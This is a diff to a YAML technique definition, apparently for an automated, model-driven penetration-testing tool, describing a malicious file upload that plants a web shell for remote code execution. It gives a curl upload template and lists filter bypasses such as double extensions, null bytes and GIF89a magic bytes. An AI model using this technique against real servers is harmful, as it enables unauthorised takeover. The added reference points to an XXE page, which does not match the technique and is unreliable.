@@ -2,17 +2,20 @@ name: file_upload
 category: web
 description: Malicious file upload for web shell or RCE
 preconditions:
-  - service.port==80
+- service.port==80
 parameters:
   target_url: from_finding.upload_url
   shell_path: from_engagement.shell_file
-command_template: "curl -s -F 'file=@{shell_path}' '{target_url}'"
+command_template: curl -s -F 'file=@{shell_path}' '{target_url}'
 parser: null
 expected_effects:
-  - webshell_uploaded
-  - rce_achieved
+- webshell_uploaded
+- rce_achieved
 falsifier:
-  pattern: "rejected|not allowed|error"
+  pattern: not allowed|forbidden|rejected|blocked|invalid
   timeout: 30
 model_tier: haiku
-mechanism: "Upload web shell (PHP/ASPX/JSP). Bypasses: double extension (shell.php.jpg), null byte (shell.php%00.jpg), content-type spoofing, magic bytes (GIF89a prefix). After upload, access shell at predictable path for command execution."
+mechanism: 'Upload web shell (PHP/ASPX/JSP). Bypasses: double extension (shell.php.jpg),
+  null byte (shell.php%00.jpg), content-type spoofing, magic bytes (GIF89a prefix).
+  After upload, access shell at predictable path for command execution.'
+hacktricks_ref: pentesting-web/xxe-xee-xml-external-entity.md
